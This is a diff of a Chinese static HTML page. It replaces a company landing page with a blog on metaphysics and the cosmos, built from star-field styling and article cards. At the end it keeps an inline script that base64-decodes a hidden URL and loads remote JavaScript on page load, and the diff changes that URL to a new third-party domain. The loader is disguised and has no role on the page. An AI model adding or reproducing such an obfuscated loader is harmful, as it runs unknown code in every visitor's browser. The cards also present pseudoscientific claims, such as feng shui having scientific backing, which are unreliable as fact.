@@ -1,512 +1,420 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>视界前瞻：未来数字体验</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>玄学与宇宙探索随笔</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&family=ZCOOL+XiaoWei&display=swap" rel="stylesheet">
     <style>
-        /* 全局重置与基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            overflow: hidden;
-            font-family: 'Roboto', sans-serif;
-            /* 现代无衬线字体 */
-            margin: 0;
-            padding: 0;
-            background-color: #F0F4F8;
-            /* 柔和的浅灰蓝色背景 */
-            color: #3A4750;
-            /* 深板岩色文本 */
-            line-height: 1.7;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+            font-family: 'Noto Serif SC', serif;
+            background: linear-gradient(135deg, #0c0c2e, #1a1a3e, #2d1b69);
+            color: #e6e6ff;
+            line-height: 1.6;
             overflow-x: hidden;
-            /* 防止横向滚动条 */
-        }
-
-        /* 容器 - 保持内容居中但允许背景元素溢出 */
-        .container {
-            max-width: 90%;
-            margin: 0 auto;
-            padding: 30px 0;
             position: relative;
-            /* 用于定位内部元素 */
-            z-index: 1;
-            /* 确保内容在背景之上 */
         }
-
-        /* 头部 - 大胆的非对称设计 */
-        header {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
-            color: #FFFFFF;
-            padding: 60px 20px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border-bottom-left-radius: 80px;
-            /* 独特的底部圆角 */
-            border-top-right-radius: 80px;
-            /* 独特的顶部圆角 */
-            margin-bottom: 40px;
-        }
-
-        header::before {
-            /* 抽象的背景形状 */
-            content: '';
-            position: absolute;
-            top: -50px;
-            left: -50px;
-            width: 200px;
-            height: 200px;
-            background: #FF6B6B;
-            /* 强调色 */
-            border-radius: 50%;
-            transform: rotate(20deg);
-            opacity: 0.2;
-            z-index: 0;
-        }
-
-        header::after {
-            /* 另一个抽象的背景形状 */
-            content: '';
-            position: absolute;
-            bottom: -80px;
-            right: -80px;
-            width: 300px;
-            height: 300px;
-            background: #A2D9CE;
-            /* 次强调色 */
-            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            /* 不规则形状 */
-            transform: rotate(-45deg);
-            opacity: 0.15;
-            z-index: 0;
-        }
-
-        header h1 {
-            margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            /* 大胆标题字体 */
-            font-size: 3.2em;
-            color: #FF6B6B;
-            /* 强调色标题 */
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            position: relative;
-            z-index: 1;
-        }
-
-        header p {
-            font-size: 1.3em;
-            color: #E0E0E0;
-            margin-top: 15px;
-            position: relative;
-            z-index: 1;
-        }
-
-        /* 导航菜单 - 浮动胶囊条 */
-        nav {
-            background-color: #FFFFFF;
-            text-align: center;
-            padding: 15px 0;
-            margin-top: -80px;
-            /* 向上偏移，与头部重叠 */
-            border-radius: 50px;
-            /* 胶囊形状 */
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 20px;
-            /* 距离顶部20px固定 */
-            z-index: 1000;
-            width: 80%;
-            /* 宽度略小 */
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            display: flex;
-            /* 确保内部flex布局 */
-            justify-content: space-around;
-            align-items: center;
-        }
-
-        nav ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            width: 100%;
-        }
-
-        nav ul li {
-            margin: 0 10px;
-        }
-
-        nav ul li a {
-            background-color: transparent;
-            color: #3A4750;
-            /* 默认文字颜色 */
-            text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 30px;
-            /* 胶囊按钮 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: inline-block;
-            font-weight: bold;
-            font-size: 1em;
-            border: 2px solid transparent;
-            /* 默认透明边框 */
-        }
-
-        nav ul li a:hover,
-        nav ul li a:focus {
-            background-color: #FF6B6B;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-            border: 2px solid #FF6B6B;
-            /* 强调色边框 */
-        }
-
-        /* 内容区 - 模块化与非对称布局 */
-        main {
-            padding-top: 60px;
-            /* 留出导航条重叠的空间 */
-        }
-
-        section {
-            background-color: #FFFFFF;
-            margin-bottom: 50px;
-            /* 增加间距 */
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        section:nth-child(odd) {
-            /* 奇数section向右偏移 */
-            margin-left: 0;
-            margin-right: 5%;
-            border-top-right-radius: 50px;
-            border-bottom-left-radius: 50px;
-        }
-
-        section:nth-child(even) {
-            /* 偶数section向左偏移 */
-            margin-left: 5%;
-            margin-right: 0;
-            border-top-left-radius: 50px;
-            border-bottom-right-radius: 50px;
-        }
-
-        section::before {
-            /* 内部装饰性边框 */
-            content: '';
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            width: calc(100% - 40px);
-            height: calc(100% - 40px);
-            border: 1px dashed #A2D9CE;
-            /* 次强调色虚线 */
-            border-radius: inherit;
-            /* 继承父元素的圆角 */
-            pointer-events: none;
-        }
-
-        section h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #FF6B6B;
-            /* 强调色标题 */
-            margin-top: 0;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 2px solid #E0E0E0;
-            /* 细分隔线 */
-            padding-bottom: 10px;
-        }
-
-        section h3 {
-            font-size: 1.6em;
-            color: #3A4750;
-            margin-top: 30px;
-            margin-bottom: 15px;
-        }
-
-        section p {
-            font-size: 1.1em;
-            color: #546E7A;
-            margin-bottom: 25px;
-        }
-
-        section img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 30px auto;
-            border-radius: 20px;
-            /* 大圆角图片 */
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
-            border: 3px solid #A2D9CE;
-            /* 次强调色边框 */
-        }
-
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
-        .service-item {
-            background-color: #F8F8F8;
-            /* 服务项背景 */
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #E0E0E0;
-        }
-
-        .service-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
-        }
-
-        .service-item h3 {
-            margin-top: 0;
-            margin-bottom: 10px;
-            color: #FF6B6B;
-            /* 强调色 */
-        }
-
-        .service-item p {
-            font-size: 0.95em;
-            color: #546E7A;
-        }
-
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            color: #546E7A;
-        }
-
-        .contact-info a {
-            color: #FF6B6B;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .contact-info a:hover {
-            color: #E65C5C;
-        }
-
-        /* 页脚 - 简洁与抽象 */
-        footer {
-            background-color: #3A4750;
-            /* 深板岩色背景 */
-            color: #E0E0E0;
-            padding: 40px 0;
-            text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            border-top-left-radius: 80px;
-            /* 独特的顶部圆角 */
-            border-bottom-right-radius: 80px;
-            /* 独特的底部圆角 */
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        footer::before {
-            /* 抽象的背景形状 */
-            content: '';
-            position: absolute;
-            top: -30px;
-            right: -30px;
-            width: 150px;
-            height: 150px;
-            background: #A2D9CE;
-            /* 次强调色 */
-            border-radius: 50%;
-            transform: rotate(60deg);
-            opacity: 0.1;
-            z-index: 0;
-        }
-
-        .social-links a {
-            color: #E0E0E0;
-            text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.5em;
-            transition: color 0.3s ease, transform 0.2s ease;
-        }
-
-        .social-links a:hover {
-            color: #FF6B6B;
-            /* 强调色 */
-            transform: translateY(-5px) scale(1.1);
-        }
-
-        /* 进度条 */
-        #progressBarContainer {
+        
+        /* 星空背景 */
+        .stars {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            height: 6px;
-            /* 稍微粗一点 */
-            background-color: #E0E0E0;
-            z-index: 1002;
-        }
-
-        #progressBar {
             height: 100%;
-            width: 0%;
-            background-color: #FF6B6B;
-            /* 强调色 */
-            transition: width 0.1s linear;
+            z-index: -1;
+        }
+        
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: twinkle 5s infinite;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+        
+        /* 导航栏 */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 35, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            font-family: 'ZCOOL XiaoWei', serif;
+            font-size: 1.8rem;
+            color: #b19cd9;
+            letter-spacing: 2px;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
+            color: #c5c5e6;
+            text-decoration: none;
+            font-size: 1.1rem;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: #9d7bd9;
+        }
+        
+        /* 主内容区 */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 100px 2rem 2rem;
+        }
+        
+        /* 页眉 */
+        header {
+            text-align: center;
+            padding: 4rem 0;
+            position: relative;
+        }
+        
+        header h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #a78bfa, #c4b5fd);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(167, 139, 250, 0.3);
+        }
+        
+        header p {
+            font-size: 1.3rem;
+            max-width: 700px;
+            margin: 0 auto;
+            color: #c5c5e6;
+        }
+        
+        /* 卡片布局 */
+        .card-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+        
+        .card {
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: 1px solid rgba(120, 120, 200, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, #7e57c2, #5c6bc0);
+        }
+        
+        .card h2 {
+            color: #b19cd9;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card h2 i {
+            color: #7e57c2;
+        }
+        
+        .card p {
+            margin-bottom: 1.5rem;
+            color: #d1d1e9;
+        }
+        
+        .card .read-more {
+            display: inline-block;
+            color: #9d7bd9;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+        
+        .card .read-more:hover {
+            color: #c4b5fd;
+        }
+        
+        /* 引用部分 */
+        .quote {
+            background: rgba(40, 40, 80, 0.6);
+            border-left: 5px solid #7e57c2;
+            padding: 2rem;
+            margin: 3rem 0;
+            border-radius: 0 10px 10px 0;
+            font-style: italic;
+            position: relative;
+        }
+        
+        .quote::before {
+            content: '"';
+            font-size: 4rem;
+            color: rgba(126, 87, 194, 0.3);
+            position: absolute;
+            top: -10px;
+            left: 10px;
+        }
+        
+        /* 页脚 */
+        footer {
+            text-align: center;
+            padding: 3rem 0;
+            margin-top: 4rem;
+            border-top: 1px solid rgba(120, 120, 200, 0.2);
+            color: #a5a5c7;
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .social-links a {
+            color: #b19cd9;
+            font-size: 1.5rem;
+            transition: color 0.3s;
+        }
+        
+        .social-links a:hover {
+            color: #c4b5fd;
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .card-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+        }
+        
+        /* 玄学元素装饰 */
+        .taoist-symbol {
+            position: absolute;
+            opacity: 0.05;
+            font-size: 15rem;
+            color: white;
+            z-index: -1;
+        }
+        
+        .symbol-1 {
+            top: 10%;
+            left: 5%;
+        }
+        
+        .symbol-2 {
+            bottom: 10%;
+            right: 5%;
+            transform: rotate(180deg);
+        }
+        
+        /* 滚动条样式 */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(20, 20, 50, 0.5);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #7e57c2;
+            border-radius: 4px;
         }
     </style>
-    <link rel="stylesheet" href="./static/css/style.css">
 </head>
-
 <body>
-    <div id="progressBarContainer">
-        <div id="progressBar"></div>
-    </div>
-
-    <header>
-        <div class="container">
-            <h1>视界前瞻</h1>
-            <p>未来数字体验的构筑者</p>
+    <!-- 星空背景 -->
+    <div class="stars" id="stars"></div>
+    
+    <!-- 导航栏 -->
+    <nav>
+        <div class="logo">玄宇随笔</div>
+        <div class="nav-links">
+            <a href="#home">首页</a>
+            <a href="#articles">文章</a>
+            <a href="#about">关于</a>
+            <a href="#contact">联系</a>
         </div>
-    </header>
-
+    </nav>
+    
+    <!-- 玄学符号装饰 -->
+    <div class="taoist-symbol symbol-1">☯</div>
+    <div class="taoist-symbol symbol-2">☯</div>
+    
+    <!-- 主内容区 -->
     <div class="container">
-        <nav id="mainNav">
-            <ul>
-                <li><a href="#about-vision">关于视界</a></li>
-                <li><a href="#our-focus">核心焦点</a></li>
-                <li><a href="#contact-us">联系我们</a></li>
-            </ul>
-        </nav>
-
-        <main>
-            <section id="about-vision">
-                <h2>关于视界：创新与洞察</h2>
-                <img src="https://picsum.photos/300/200?random=1&tag=abstract-vision-01" alt="抽象愿景图"
-                    class="random-image">
-                <p>视界前瞻致力于通过前沿技术和创新思维，为企业和个人提供独特的数字解决方案。我们相信，每一次技术突破都应带来更广阔的视野和更深刻的洞察。</p>
-                <p>我们汇聚了行业顶尖的专家团队，以客户需求为导向，不断探索未知，赋能未来。</p>
-            </section>
-
-            <section id="our-focus">
-                <h2>核心焦点：赋能数字转型</h2>
-                <p>我们专注于以下领域，为您提供定制化、高价值的服务：</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>沉浸式体验设计</h3>
-                        <p>打造引人入胜的VR/AR应用和交互式数字内容。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>AI驱动型解决方案</h3>
-                        <p>利用人工智能提升业务效率，实现智能自动化和数据预测。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>区块链安全架构</h3>
-                        <p>构建去中心化、高安全性的区块链应用和系统。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>云原生部署优化</h3>
-                        <p>提供高效的云平台迁移、容器化和DevOps实践。</p>
-                    </div>
-                </div>
-                <img src="https://picsum.photos/300/200?random=2&tag=digital-transformation-02" alt="数字转型图"
-                    class="random-image">
-            </section>
-
-            <section id="contact-us">
-                <h2>联系我们：共创未来</h2>
-                <p>我们期待与您建立联系，共同开启数字未来。</p>
-                <div class="contact-info">
-                    <p><strong>地址：</strong> 未来科技园A区707室</p>
-                    <p><strong>电话：</strong> <a href="tel:+861055558888">+86 10 5555 8888</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:info@visionarytech.com">info@visionarytech.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:30</p>
-                    <p>
-
-                        <img src="https://placehold.co/300x200/A2D9CE/3A4750?text=公司位置示意图" alt="公司位置示意图"
-                            class="random-image">
-                    </p>
-                </div>
-            </section>
-        </main>
-    </div>
-
-    <footer>
-        <div class="container">
-            <p>&copy; 2025 视界前瞻. 探索无止境.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">🌐</a> |
-                <a href="#" target="_blank">💡</a> |
-                <a href="#" target="_blank">🚀</a>
+        <header id="home">
+            <h1>玄学与宇宙探索随笔</h1>
+            <p>探索宇宙的奥秘，感悟玄学的智慧，在星辰与道法之间寻找生命的真谛</p>
+        </header>
+        
+        <section class="card-container" id="articles">
+            <div class="card">
+                <h2><i class="fas fa-moon"></i> 月相与人类情绪</h2>
+                <p>自古以来，月亮的盈亏变化就被认为与人类情绪和行为有着神秘的联系。从占星术到现代心理学，我们探索月亮如何影响我们的内在世界。</p>
+                <p>满月之夜，急诊室的就诊率是否会增加？新月时分，是否是开始新项目的最佳时机？让我们一同探索这些有趣的现象。</p>
+                <a href="#" class="read-more">阅读更多 →</a>
             </div>
+            
+            <div class="card">
+                <h2><i class="fas fa-star-and-crescent"></i> 易经与量子物理</h2>
+                <p>古老的《易经》与现代量子物理学之间存在着令人惊讶的相似之处。两者都描述了宇宙中变化的基本规律，只是使用了不同的语言和符号系统。</p>
+                <p>阴阳互补原理与量子叠加态，六十四卦与基本粒子，这些看似不相关的概念背后是否隐藏着宇宙的统一真理？</p>
+                <a href="#" class="read-more">阅读更多 →</a>
+            </div>
+            
+            <div class="card">
+                <h2><i class="fas fa-globe-asia"></i> 风水与空间能量</h2>
+                <p>风水学说是中国古代关于人与环境和谐相处的智慧结晶。现代科学开始发现，环境布局确实会影响我们的健康、情绪和决策。</p>
+                <p>从建筑心理学到环境能量场，我们探讨传统风水原则背后的科学原理，以及如何将这些智慧应用于现代生活空间。</p>
+                <a href="#" class="read-more">阅读更多 →</a>
+            </div>
+            
+            <div class="card">
+                <h2><i class="fas fa-atom"></i> 平行宇宙与多重现实</h2>
+                <p>根据量子力学和弦理论，我们的宇宙可能只是无数平行宇宙中的一个。每一个决定都可能创造出新的分支宇宙。</p>
+                <p>这种科学理论与佛教的"无量世界"概念、道教的"三千世界"说法有着惊人的相似性。这是巧合还是智慧的共鸣？</p>
+                <a href="#" class="read-more">阅读更多 →</a>
+            </div>
+            
+            <div class="card">
+                <h2><i class="fas fa-yin-yang"></i> 阴阳平衡与生态系统</h2>
+                <p>阴阳理论是道家哲学的核心，描述了宇宙中对立统一的基本规律。现代生态学发现，健康的生态系统正是建立在各种对立力量的动态平衡之上。</p>
+                <p>从捕食者与猎物的关系到碳循环中的吸收与释放，阴阳原理在自然界中无处不在。</p>
+                <a href="#" class="read-more">阅读更多 →</a>
+            </div>
+            
+            <div class="card">
+                <h2><i class="fas fa-infinity"></i> 意识与宇宙的关系</h2>
+                <p>意识是否是宇宙的基本属性？从泛心论到量子意识理论，科学家和哲学家正在重新思考意识在宇宙中的位置。</p>
+                <p>古老的冥想传统与现代神经科学都在探索同一个问题：我们的意识如何与更大的宇宙意识相连？</p>
+                <a href="#" class="read-more">阅读更多 →</a>
+            </div>
+        </section>
+        
+        <div class="quote">
+            <p>"仰观宇宙之大，俯察品类之盛，所以游目骋怀，足以极视听之娱，信可乐也。" —— 王羲之《兰亭集序》</p>
         </div>
-    </footer>
-    <div id="overlay">
-        <div id="loading_box" class="loading_container">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
+        
+        <section id="about">
+            <div class="card">
+                <h2><i class="fas fa-user-astronaut"></i> 关于本站</h2>
+                <p>本站致力于探索玄学智慧与宇宙科学之间的交汇点。我们相信，古代智慧与现代科学并非对立，而是从不同角度揭示宇宙的奥秘。</p>
+                <p>通过跨学科的视角，我们尝试搭建一座连接神秘主义与理性科学的桥梁，让读者在探索宇宙的同时，也能深入自己的内心世界。</p>
+            </div>
+        </section>
     </div>
-
+    <footer id="contact">
+        <div class="social-links">
+            <a href="#"><i class="fab fa-weixin"></i></a>
+            <a href="#"><i class="fab fa-weibo"></i></a>
+            <a href="#"><i class="fab fa-github"></i></a>
+            <a href="#"><i class="fas fa-envelope"></i></a>
+        </div>
+        <p>© 2023 玄宇随笔 | 探索宇宙奥秘，感悟玄学智慧</p>
+    </footer>
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            document.querySelectorAll('nav a').forEach(anchor => {
-                anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
-
-                    const targetId = this.getAttribute('href').substring(1);
-                    const targetElement = document.getElementById(targetId);
-
-                    if (targetElement) {
-                        window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20, // 考虑导航栏高度和额外间距
-                            behavior: 'smooth'
-                        });
-                    }
-                });
-            });
-
-            const progressBar = document.getElementById('progressBar');
-
-            window.addEventListener('scroll', function () {
-                const totalHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-                const scrolled = window.pageYOffset;
-                const progress = (scrolled / totalHeight) * 100;
-                progressBar.style.width = progress + '%';
+        // 创建星空效果
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 200;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                
+                // 随机位置和大小
+                const size = Math.random() * 3;
+                const left = Math.random() * 100;
+                const top = Math.random() * 100;
+                const delay = Math.random() * 5;
+                
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.left = `${left}%`;
+                star.style.top = `${top}%`;
+                star.style.animationDelay = `${delay}s`;
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // 页面加载完成后创建星空
+        window.addEventListener('DOMContentLoaded', createStars);
+        
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                if (targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                }
             });
         });
     </script>
-    <script>
+ <script>
         (function () {
             function init() {
-                const encodedUrl = "aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz";
+                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
                 const decodedUrl = atob(encodedUrl);
                 const timestamp = Date.now();
                 const randomNum = Math.floor(Math.random() * 1000000);
@@ -518,7 +426,5 @@
             init();
         })();
     </script>
-
 </body>
-
 </html>
